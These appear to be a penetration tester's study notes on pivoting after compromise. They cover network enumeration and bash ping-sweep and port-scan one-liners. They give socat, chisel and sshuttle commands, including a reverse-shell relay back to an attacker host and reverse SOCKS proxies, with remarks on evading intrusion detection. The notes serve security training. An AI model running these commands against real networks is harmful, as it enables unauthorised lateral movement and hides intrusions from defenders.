#Phases/Methodology #Post-Exploitation 

Pivoting simply means being able to jump/communicate to another network that is not directly accessible by us (the attacker). Pivoting is possible on dual-homed victim machines (connected to 2 or more networks).

Pivoting is done by opening up a route to the remote network via the dual-homed victim machine. Once a route is open, we can scan/run attacks against the remote network and the machines on that network depending on our situation.

- [Pivoting techniques - PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Network%20Pivoting%20Techniques.md)

***

Two main methods used for pivoting:
 - **Tunneling/Proxy** : Creating a proxy type connection through a compromised machine in order to route all desired traffic into the targeted network. This could potentially also be _tunneled_ inside another protocol (e.g. SSH tunneling), which can be useful for evading a basic **I**ntrusion **D**etection **S**ystem (**IDS**) or firewall. A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.
 - **Port Forwarding** : Creating a connection between a local port and a single port on a target, via a compromised host. Tends to be faster and more reliable, but only allows us to access a single port (or a small range) on a target device.

> Which style of pivoting is more suitable will depend entirely on the layout of the network, so we'll have to start with further enumeration before we decide how to proceed. It would be sensible at this point to also start to draw up a layout of the network as you see it.

> As a general rule, if you have multiple possible entry-points, try to use a Linux/Unix target where possible, as these tend to be easier to pivot from. An outward facing Linux webserver is absolutely ideal.

## Network Enumeration
There are five possible ways to enumerate a network through a compromised host:

1.  Using material found on the machine. The hosts file or ARP cache, for example
2.  Using pre-installed tools
3.  Using statically compiled tools
4.  Using scripting techniques
5.  Using local tools through a proxy

`arp -a` can be used to Windows or Linux to check the ARP cache of the machine -- this will show you any IP addresses of hosts that the target has interacted with recently. Equally, static mappings may be found in `/etc/hosts` on Linux, or `C:\Windows\System32\drivers\etc\hosts` on Windows. `/etc/resolv.conf` on Linux may also identify any local DNS servers, which may be misconfigured to allow something like a DNS zone transfer attack (which is outwith the scope of this content, but worth looking into). On Windows the easiest way to check the DNS servers for an interface is with `ipconfig /all`. Linux has an equivalent command as an alternative to reading the resolv.conf file: `nmcli dev show`.

If there are no useful tools available on the machine, It is possible to use static copies of certain tools which can be found on the internet, such as listed [here](https://github.com/andrew-d/static-binaries). They may act/use different syntax compared to their original counterpart.

Scanning through proxies should be considered as an absolute last resort as it can be *very slow*. Use the compromised target to identify entry points on the internal network first and then use your local tools against *discovered* entry points.

### Useful bash one-liners:
 - `for i in {1..255}; do (ping -c 1 192.168.1.${i} | grep "bytes from" &); done` - executes a full ping sweep on a given network (modify values accordingly)
 - `for i in {1..65535}; do (echo > /dev/tcp/192.168.1.1/$i) >/dev/null 2>&1 && echo $i is open; done` - executes a port scan on a given host (modify values accordingly, *long* execution time)

### Tools of Interest
 - **Proxychains & FoxyProxy** - can be used to access a proxy created with one of the other tools
 - **SSH Tunneling/Port Forwarding** - can be used to create both port forwards, and proxies
 - **plink.exe** - an SSH client for Windows, allowing you to create reverse SSH connections on Windows
 - **Socat** - a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
 - **Chisel** - can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
 - **sshuttle** - a nicer way to create a proxy when we have SSH access on a target (like a VPN)

> On fully compromised targets, it is possible to create a route to the inaccessible network with iptables/firewall rules natively without ever having to use other tools.

## Socat
_**1. Reverse Shell Relay**_
```shell
> nc -nvlp PORT # Attacker machine
> socat tcp-l:L_PORT tcp:ATK_IP:PORT & # Compromised host
```

Internal connections made to the relay will be forwarded to the attacker.
_**Note:** the order of the two addresses matters here. Make sure to open the listening port first,_ then _connect back to the attacking machine._

_**2. Port Forwarding - Easy**_
```shell
> socat tcp-l:L_PORT,fork,reuseaddr tcp:INTERNAL_IP:PORT & # Compromised host
```

Requests are to be made to the listening port of the compromised host to access the internal entry point. `fork` places every connection into new processes and `reuseaddr` keeps the port open for future connections.

_**3. Port Forwarding - Quiet**_
```shell
> socat tcp-l:ATK_IN_PORT tcp-l:ATK_OUT_PORT,fork,reuseaddr & # Attacker machine
> socat tcp:ATK_IP:IN_PORT tcp:INTERNAL_IP:PORT,fork & # Compromised host
```

`ATK_IN_PORT` and `ATK_OUT_PORT` creates a local port relay, what goes into one port comes out of the other based on the usage. This method links `INTERNAL_IP:PORT` with the `ATK_OUT_PORT` without opening any port on the compromised host, making it somewhat a quieter approach. Requests are to be made to the `ATK_OUT_PORT` to access the internal entry point.

## Chisel
_**1. Reverse SOCKS Proxy**_
```shell
> chisel server -p LISTEN_PORT --reverse & # Attacker machine
> chisel client ATK_IP:LISTEN_PORT R:socks & # Compromised machine
```

The actual proxy will be opened up on a **different port**, which will be shown by the tool. The `R` switch determines what the connection going to be (a port forward or proxy), in this case a server started in reverse mode instructs the client to start a proxy server on client side.

_**2. Forward SOCKS Proxy**_
```shell
> chisel server -p LISTEN_PORT --socks5 & # Compromised host
> chisel client SERVER_IP:LISTEN_PORT PROXY_PORT:socks & # Attacker machine
```

`PROXY_PORT` will be the access point for the proxy. Forward proxies are rarer than reverse proxies for the same reason as reverse shells are more common than bind shells; generally speaking, egress firewalls (handling outbound traffic) are less stringent than ingress firewalls (which handle inbound connections).

_**Note:**_ in order to **use** the proxy, proxy managers like **FoxyProxy** (web apps) and **ProxyChains** has to configured to route the traffic through said proxy so our tools can communicate with the other side.

_**3. Remote Port Forward**_
```shell
> chisel server -p LISTEN_PORT --reverse & # Attacker machine
> chisel client ATK_IP:LISTEN_PORT R:LOCAL_PORT:INTERNAL_IP:PORT & # Compromised host
```

`LISTEN_PORT` is reserved for the proxy and `LOCAL_PORT` on the attacker machine will be used to access the internal entry point.

_**4. Local Port Forward**_
```shell
> chisel server -p LISTEN_PORT & # Compromised host
> chisel client SERVER_IP:LISTEN_PORT LOCAL_PORT:INTERNAL_IP:PORT & # Attacker machine
```

Similar to **reverse port forward** but the roles have been changed.

## sshuttle

> [This article](https://linuxize.com/post/how-to-setup-ssh-tunneling/) explains how to setup port forwarding with the native ssh client

```shell
> # General syntax
> sshuttle -r USER@IP SUBNET
> sshuttle -r bob@172.8.0.5 172.8.0.0/24 &
> # "-N" switch can be used to automatically determine the subnet instead of manually providing the subnet
> 
> # For key-based authentication
> sshuttle -r USER@IP SUBNET --ssh-cmd "ssh -i KEYFILE" SUBNET &
> 
> # If the compromised host is a part of the subnet you are trying to access, it must be excluded for proxy to work. This is done with "-x" switch
> sshuttle -r USER@IP SUBNET -x IP &
```

sshuttle creates a tunneled proxy which acts as a separate interface. In other words, it simulates a VPN, allowing us to directly communicate with the target devices without having to use ProxyChains or equivalent.

However there are drawbacks. This will only work against Linux targets, and the need for SSH access itself. Python has to be installed on the target server as well, but with SSH access its theoretically possible to upload a static binary and work with that.

But when this _is_ an option, then it is recommended to be used.

> _**Tip:**_ On Linux systems, "&" is used to background certain jobs so we can continue using the same shell instance. This is important when we have limited shell access on the target. Background tasks can be viewed with `jobs` or `ps aux` commands. They can be killed with `kill %JOB_ID` or `kill PID` commands.
> For Windows systems, PowerShell can be used to run background jobs. [Documentation](https://docs.microsoft.com/en-us/powershell/scripting/developer/cmdlet/background-jobs?view=powershell-7.2) can be found here.

## SSH and Meterpreter / Metasploit
- [By Tibr3ius](https://github.com/Tib3rius/Pentest-Cheatsheets/blob/master/exploits/pivoting.rst)

